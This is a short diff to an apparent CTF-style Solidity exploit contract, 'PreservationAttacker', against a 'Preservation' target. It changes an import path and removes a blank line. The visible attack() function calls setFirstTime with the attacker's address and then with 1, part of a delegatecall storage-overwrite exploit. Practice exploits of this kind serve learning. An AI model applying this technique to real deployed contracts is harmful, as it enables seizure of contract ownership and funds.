@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import "./Preservation.sol";
+import "./target/Preservation.sol";
 
 contract PreservationAttacker {
     // public library contracts
@@ -17,7 +17,6 @@ contract PreservationAttacker {
 
     function attack() public {
         preservation.setFirstTime(uint(uint160(address(this))));
-
         preservation.setFirstTime(1);
     }
 
